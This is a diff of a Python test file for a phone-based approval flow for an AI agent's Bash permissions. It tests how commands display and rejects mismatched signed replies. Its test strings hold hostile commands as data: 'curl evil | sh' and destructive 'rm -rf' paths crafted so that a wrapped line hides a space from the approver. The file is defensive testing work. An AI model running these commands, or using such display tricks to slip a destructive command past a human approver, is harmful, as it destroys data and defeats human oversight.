@@ -1366,6 +1366,10 @@ class ConversationTest(unittest.IsolatedAsyncioTestCase):
                 ("a blank line", "Allow Bash?\necho ok\n\ncurl evil | sh"),
                 ("trailing spaces", "Allow Bash?\necho ok   \ncurl evil | sh"),
                 ("a trailing newline", "Allow Bash?\necho ok\n"),
+                ("a tab, which can draw as a gap of a few pixels", "Allow Bash?\nrm -rf ~/proj/build\t~"),
+                # The review's pair: a phone that wraps this line draws both the same.
+                ("a line long enough to wrap, with a space", "Allow Bash?\nrm -rf /Users/benny/ tmp_build_artifacts_cache_2026"),
+                ("a line long enough to wrap, without one", "Allow Bash?\nrm -rf /Users/benny/tmp_build_artifacts_cache_2026"),
                 ("more than it shows", "Allow Bash?\n" + "x" * 1000)):
             with self.subTest(name):
                 self.phone.controls.clear()
@@ -1385,16 +1389,17 @@ class ConversationTest(unittest.IsolatedAsyncioTestCase):
             return base64.b64encode(key.sign(message.encode(), ec.ECDSA(hashes.SHA256()))).decode()
 
         text = "Allow Bash?\nrm -rf build"
-        asked = self.offer_permission(text=text)
-        for name, message in (
-                ("other words", security.permission_message(asked["nonce"], "req-1", "allow", "Allow Bash?\nls")),
-                ("another request", security.permission_message(asked["nonce"], "req-2", "allow", text)),
-                ("the other answer", security.permission_message(asked["nonce"], "req-1", "deny", text)),
-                ("another challenge", security.permission_message("other-nonce", "req-1", "allow", text))):
+        # Each wrong message is signed under the challenge then on offer, so only the part named is wrong.
+        for name, wrong in (
+                ("other words", lambda nonce: security.permission_message(nonce, "req-1", "allow", "Allow Bash?\nls")),
+                ("another request", lambda nonce: security.permission_message(nonce, "req-2", "allow", text)),
+                ("a Deny sent as an Approve", lambda nonce: security.permission_message(nonce, "req-1", "deny", text)),
+                ("another challenge", lambda nonce: security.permission_message("other-nonce", "req-1", "allow", text))):
             with self.subTest(name):
-                self.answer_permission(asked, "allow", sig=sign(message))
-                self.assertFalse(any("permission" in order for order in self.session.orders))
                 asked = self.offer_permission(text=text)
+                self.answer_permission(asked, "allow", sig=sign(wrong(asked["nonce"])))
+                self.assertFalse(any("permission" in order for order in self.session.orders))
+        asked = self.offer_permission(text=text)
         self.answer_permission(asked, "allow", sig=sign(security.permission_message(asked["nonce"], "req-1", "allow", text)))
         self.assertEqual(self.order_for("permission")["permission"]["decision"], "allow")
 
